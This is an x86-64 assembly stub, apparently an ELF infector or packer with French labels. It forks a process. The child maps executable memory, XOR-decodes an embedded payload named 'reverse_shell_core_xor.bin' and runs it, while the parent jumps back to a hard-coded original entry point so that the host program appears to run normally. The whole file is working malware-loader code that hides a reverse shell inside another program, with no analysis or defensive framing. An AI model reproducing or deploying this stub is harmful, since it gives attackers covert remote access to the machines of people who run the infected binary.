BITS 64
global _start

_start:
    xor     rax, rax
    mov     al, 57
    syscall
    test    rax, rax
    jnz     retour_pere

    xor     rdi, rdi
    mov     rsi, 0x1000
    mov     rdx, 7
    mov     r10, 0x22
    mov     r8, -1
    xor     r9, r9
    mov     rax, 9
    syscall
    mov     r15, rax

    lea     rsi, [rel payload]
    mov     rdi, r15
    mov     rcx, payload_fin - payload
    mov     r14, rcx
    rep     movsb

    mov     rsi, r15
    mov     rcx, r14
dechiffre:
    xor     byte [rsi], 0x41
    inc     rsi
    loop    dechiffre

    jmp     r15

retour_pere:
    mov     rax, 0x401050
    jmp     rax

payload:
    incbin "payload/reverse_shell_core_xor.bin"
payload_fin:
